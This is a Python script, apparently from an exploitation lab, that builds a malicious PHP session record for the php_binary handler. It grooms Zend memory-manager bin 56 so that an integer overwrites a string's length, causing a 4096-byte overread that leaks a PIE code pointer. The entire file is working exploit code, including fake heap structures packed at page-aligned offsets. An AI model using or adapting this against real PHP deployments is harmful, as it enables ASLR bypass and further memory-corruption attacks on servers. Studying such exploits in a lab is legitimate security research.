#!/usr/bin/env python3
"""PIE-lab leak record builder v6 (php_binary handler).

Record order:  KEY(s:SLEN) | J(i:4096) | X(s:XLEN) | K(filler) | a0(array)
KEY is a session key of length KLEN chosen so that its zend_string allocation
is in Zend MM bin 56 (KLEN 25..31).  The KEY name string is allocated before
its value, consumes the 8-mod-16 bin 56 free slot, and leaves the next free
slot (16 aligned) for the S value string.

dtor slot addresses,  slot(n) = B0+0x10+16*(U0+n-1)
  rec1 S -> S        (U0 = (S-B0)/16 - 1)
  rec2 J -> S+0x10   (IS_LONG 4096 overwrites S->len)
  rec3 X -> S+0x20
  rec4 K -> S+0x30
  rec5 a0 -> S+0x40
X is a small bin-56 string allocated at S+0x38, so the array HashTable (bin 56)
is allocated at S+0x70 and its pDestructor (zval_ptr_dtor, PIE text) at S+0xA0
lands inside the 4096 byte overread window.
"""
import struct
import sys

PAGE = 0x1000


def rec(name, val):
    nb = name.encode()
    assert 1 <= len(nb) <= 127, name
    return bytes([len(nb)]) + nb + val


def build(total, val, P, B0, U0, slen, klen, xlen):
    key = 'A' * klen
    head = (rec(key, b's:%d:"' % slen + b'Q' * slen + b'";') +
            rec('J', b'i:4096;') +
            rec('X', b's:%d:"' % xlen + b'X' * xlen + b'";'))
    tail = rec('a0', b'a:1:{i:0;i:1;}')
    L = total - len(head) - len(rec('K', b's:')) - len(tail) - 2 - 1
    for _ in range(16):
        h = rec('K', b's:%d:"' % L)
        nl = total - len(head) - len(h) - len(tail) - 2
        if nl == L:
            break
        L = nl
    h = rec('K', b's:%d:"' % L)
    payload_start = len(head) + len(h)
    payload = bytearray(b'A' * L)
    reps = 0
    for m in range(1, total // PAGE + 2):
        off = m * PAGE - 0x18
        b = off - payload_start
        if b < 0 or b + 0x48 > L:
            continue
        struct.pack_into('<QQQQQQQQ', payload, b,
                         P + 56, B0, B0, 0, 0, 0, 0x7fffffff, 1018)
        struct.pack_into('<Q', payload, b + 64, 0)
        reps += 1
    boff = (B0 - val) - payload_start
    assert 0 <= boff and boff + 16 <= L, (hex(B0), boff, L)
    struct.pack_into('<qQ', payload, boff, U0, 0)
    data = head + h + bytes(payload) + b'";' + tail
    assert len(data) == total, (len(data), total)
    return data, dict(total=total, val=hex(val), P=hex(P), B0=hex(B0), U0=U0,
                      reps=reps, payload_start=payload_start, L=L,
                      b_off=boff, head=len(head), khdr=len(h),
                      slen=slen, klen=klen, xlen=xlen)


def main():
    out = sys.argv[1]
    total = int(sys.argv[2], 0)
    val = int(sys.argv[3], 0)
    P = int(sys.argv[4], 0)
    B0 = int(sys.argv[5], 0)
    U0 = int(sys.argv[6], 0)
    slen = int(sys.argv[7], 0)
    klen = int(sys.argv[8], 0)
    xlen = int(sys.argv[9], 0)
    data, meta = build(total, val, P, B0, U0, slen, klen, xlen)
    with open(out, 'wb') as fp:
        fp.write(data)
    print('wrote %s %d' % (out, len(data)))
    for k, v in meta.items():
        print('  %s=%s' % (k, v))


if __name__ == '__main__':
    main()
